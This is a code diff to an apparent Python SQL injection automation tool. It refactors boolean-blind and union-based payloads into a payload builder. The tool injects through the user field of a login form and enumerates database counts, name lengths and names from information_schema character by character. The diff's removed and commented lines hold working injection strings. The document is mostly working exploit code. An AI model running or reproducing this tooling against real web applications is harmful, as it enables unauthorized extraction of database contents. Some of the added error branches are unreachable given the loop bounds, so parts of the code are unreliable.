@@ -68,11 +68,15 @@ class SqliDatabases(SqliTest):
 
                 for i in trange(100, desc='Database amount sqli', leave=False):
                     # 先注databases的数量
-                    payload = "user=user1' %26%26 (SElECT ((SELECT COUNT(SCHEMA_NAME) from information_schema.SCHEMATA limit 0,1) > " + repr(
-                        i) + "))%23&passwd=ddog123&submit=Log+In"
+                    # payload = "user=user1' %26%26 (SElECT ((SELECT COUNT(SCHEMA_NAME) from information_schema.SCHEMATA limit 0,1) > " + repr(
+                    #     i) + "))%23&passwd=ddog123&submit=Log+In"
+                    payload = self.dealpayload.construct_build_payload(select="COUNT(SCHEMA_NAME)", source="information_schema.SCHEMATA", compare=i)
                     if self.Data.GetBuildData(payload, self.len) == 0:
                         databases_number = i
                         break
+                    elif i == 100:
+                        logger.error("Databases number > 100...")
+                        databases_number = 100
 
                 logger.debug("Databases amount sqli success...The databases_number is %d..." % databases_number)
                 logger.info("[*] databases_number: %d" % databases_number)
@@ -81,11 +85,18 @@ class SqliDatabases(SqliTest):
 
                     logger.debug("Start %dth database length sqli..." % (i + 1))
                     # 然后注databases_name 的 length
-                    for j in trange(30, desc="%dth Database length sqli..." % (i + 1), leave=False):
-                        payload = "user=user1' %26%26  (select ((SELECT length(SCHEMA_NAME) from information_schema.SCHEMATA limit " + repr(i) + ",1) > " + repr(j) + "))%23&passwd=ddog123&submit=Log+In"
+                    for j in trange(50, desc="%dth Database length sqli..." % (i + 1), leave=False):
+                        # payload = "user=user1' %26%26  (select ((SELECT length(SCHEMA_NAME) from information_schema.SCHEMATA limit " + repr(i) + ",1) > " + repr(j) + "))%23&passwd=ddog123&submit=Log+In"
+                        payload = self.dealpayload.construct_build_payload(select="length(SCHEMA_NAME)",
+                                                                           source="information_schema.SCHEMATA",
+                                                                           limit=i,
+                                                                           compare=j)
                         if self.Data.GetBuildData(payload, self.len) == 0:
                             databases_name_len = j
                             break
+                        elif j == 50:
+                            logger.error("Database length > 100...")
+                            databases_name_len = 100
 
                     logger.debug("%dth Databases name length sqli success...The databases_name_len is %d..." % ((i + 1), databases_name_len))
                     logger.info("[*] %dth databases_name_len: %d" % ((i + 1), databases_name_len))
@@ -96,9 +107,13 @@ class SqliDatabases(SqliTest):
                     logger.debug("Start %dth database sqli..." % (i + 1))
                     for j in trange(int(databases_name_len), desc='%dth Database sqli' % (i + 1), leave=False):
                         for k in trange(100, desc='%dth Database\'s %dth char sqli' % ((i + 1), (j + 1)), leave=False):
-                            payload = "user=user1' %26%26 (select (SELECT ascii(substring(SCHEMA_NAME," + repr(
-                                j + 1) + ",1)) from information_schema.SCHEMATA limit " + repr(
-                                i) + ",1) >" + repr(k + 30) + ")%23&passwd=ddog123&submit=Log+In"
+                            # payload = "user=user1' %26%26 (select (SELECT ascii(substring(SCHEMA_NAME," + repr(
+                            #     j + 1) + ",1)) from information_schema.SCHEMATA limit " + repr(
+                            #     i) + ",1) >" + repr(k + 30) + ")%23&passwd=ddog123&submit=Log+In"
+                            payload = self.dealpayload.construct_build_payload(select="ascii(substring(SCHEMA_NAME," + repr(j + 1) + ",1))",
+                                                                               source="information_schema.SCHEMATA",
+                                                                               limit=i,
+                                                                               compare=(k + 30))
                             if self.Data.GetBuildData(payload, self.len) == 0:
                                 databases_name += chr(int(k + 30))
                                 break
@@ -192,7 +207,8 @@ class SqliDatabases(SqliTest):
                     #     "user": "ddog123' union  SELECT 1,length(SCHEMA_NAME) from information_schema.SCHEMATA limit " + repr(
                     #         i) + ",1#", "passwd": "ddog123&submit=Log+In"}
                     payload = self.dealpayload.construct_normal_payload(select='length(SCHEMA_NAME)',
-                                                                        source='information_schema.SCHEMATA')
+                                                                        source='information_schema.SCHEMATA',
+                                                                        limit=i)
                     r = self.Data.PostData(payload)
                     databases_name_len = int(UnpackFunction(r))
                     logger.debug("%dth Databases name length sqli success...The databases_name_len is %d..." % ((i + 1), databases_name_len))
@@ -204,7 +220,8 @@ class SqliDatabases(SqliTest):
                     #     "user": "ddog123' union SELECT 1,SCHEMA_NAME from information_schema.SCHEMATA limit " + repr(
                     #         i) + ",1#", "passwd": "ddog123"}
                     payload = self.dealpayload.construct_normal_payload(select='SCHEMA_NAME',
-                                                                        source='information_schema.SCHEMATA')
+                                                                        source='information_schema.SCHEMATA',
+                                                                        limit=i)
                     r = self.Data.PostData(payload)
                     databases_name = UnpackFunction(r)
                     logger.debug("%dth Databases name sqli success...The databases_name is %s..." % ((i + 1), databases_name))
@@ -221,9 +238,11 @@ class SqliDatabases(SqliTest):
 
                 for i in trange(100, desc='Database amount sqli', leave=False):
                     # 先注databases的数量
-                    payload = {
-                        "user": "user1' && (SElECT ((SELECT COUNT(SCHEMA_NAME) from information_schema.SCHEMATA limit 0,1) > " + repr(
-                            i) + "))#", "passwd": "ddog123"}
+                    # payload = {
+                    #     "user": "user1' && (SElECT ((SELECT COUNT(SCHEMA_NAME) from information_schema.SCHEMATA limit 0,1) > " + repr(
+                    #         i) + "))#", "passwd": "ddog123"}
+                    payload = self.dealpayload.construct_build_payload(select="COUNT(SCHEMA_NAME)",
+                                                                       source="information_schema.SCHEMATA", compare=i)
                     if self.Data.PostBuildData(payload, self.len) == 0:
                         databases_number = i
                         break
@@ -236,9 +255,13 @@ class SqliDatabases(SqliTest):
                     # 然后注databases_name 的 length
                     logger.debug("Start %dth database length sqli..." % (i + 1))
                     for j in trange(30, desc="%dth Database length sqli..." % (i + 1), leave=False):
-                        payload = {
-                            "user": "user1' && (select ((SELECT length(SCHEMA_NAME) from information_schema.SCHEMATA limit " + repr(
-                                i) + ",1) > " + repr(j) + "))#", "passwd": "ddog123"}
+                        # payload = {
+                        #     "user": "user1' && (select ((SELECT length(SCHEMA_NAME) from information_schema.SCHEMATA limit " + repr(
+                        #         i) + ",1) > " + repr(j) + "))#", "passwd": "ddog123"}
+                        payload = self.dealpayload.construct_build_payload(select="length(SCHEMA_NAME)",
+                                                                           source="information_schema.SCHEMATA",
+                                                                           limit=i,
+                                                                           compare=j)
                         if self.Data.PostBuildData(payload, self.len) == 0:
                             databases_name_len = j
                             break
@@ -254,9 +277,14 @@ class SqliDatabases(SqliTest):
                     for j in trange(int(databases_name_len), desc='%dth Database sqli' % (i + 1), leave=False):
                         for k in trange(100, desc='%dth Database\'s %dth char sqli' % ((i + 1), (j + 1)), leave=False):
 
-                            payload = {"user": "user1' && (select ((SELECT ascii(substring(SCHEMA_NAME," + repr(
-                                j + 1) + ",1)) from information_schema.SCHEMATA limit " + repr(
-                                i) + ",1) >" + repr(k + 30) + "))#", "passwd": "ddog123"}
+                            # payload = {"user": "user1' && (select ((SELECT ascii(substring(SCHEMA_NAME," + repr(
+                            #     j + 1) + ",1)) from information_schema.SCHEMATA limit " + repr(
+                            #     i) + ",1) >" + repr(k + 30) + "))#", "passwd": "ddog123"}
+                            payload = self.dealpayload.construct_build_payload(
+                                select="ascii(substring(SCHEMA_NAME," + repr(j + 1) + ",1))",
+                                source="information_schema.SCHEMATA",
+                                limit=i,
+                                compare=(k + 30))
                             if self.Data.PostBuildData(payload, self.len) == 0:
                                 databases_name += chr(int(k + 30))
                                 break
